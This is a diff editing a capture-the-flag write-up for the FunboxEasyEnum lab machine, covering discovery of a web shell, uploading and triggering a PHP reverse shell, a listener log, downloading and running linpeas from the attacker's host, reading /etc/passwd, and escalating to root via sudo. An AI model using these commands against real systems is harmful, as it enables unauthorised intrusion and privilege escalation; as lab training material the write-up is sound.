@@ -1,9 +1,5 @@
----
-tags:
-  - intermediate
-  - linux
-  - enum
----
+# FunboxEasyEnum
+
 ## Nmap scan
 
 ```shell
@@ -107,7 +103,6 @@ Finished
 ```
 
 Another web resource was found which was initially missed.
-
 ### http://funboxeasyenum/mini.php
 
 ![](png/funboxeasyenum-mini-shell.png)
@@ -145,11 +140,12 @@ After editing, we can upload it to `mini.php`. It should reflect after uploading
 
 Starting a listener, we access the resource.
 
-```shell title:"Accessing the resource"
+```shell
 curl http://funboxeasyenum/php-reverse-shell.php
 ```
 
 ```shell
+nv -lvnp 4444
 listening on [any] 4444 ...
 connect to [192.168.45.169] from (UNKNOWN) [192.168.182.132] 50364
 Linux funbox7 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
@@ -164,12 +160,13 @@ $
 
 ## Privilege Escalation
 
-```shell title:"Spawn tty shell"
+```shell
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
-www-data@funbox7:/$ 
+www-data@funbox7:/$ mkdir /tmp/privesc && cd /tmp/privesc && wget http://192.168.45.169:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
 ```
+Linpeas found some interesting configuration files
 
-```shell title:"linpeas.sh output"
+```shell
 <...>
 ╔══════════╣ Readable files belonging to root and readable by me but not world readable
 -rw-r----- 1 root www-data 525 Sep 18  2020 /etc/phpmyadmin/config-db.php
@@ -179,7 +176,7 @@ www-data@funbox7:/$
 <...>
 ```
 
-```shell title:"/etc/passwd"
+```shell
 www-data@funbox7:/$ cat /etc/passwd
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -340,7 +337,3 @@ This user has permissions to run all binaries as sudo.
 karla@funbox7:~$ sudo -i
 root@funbox7:~# cat proof.txt
 ```
-
-
-
-
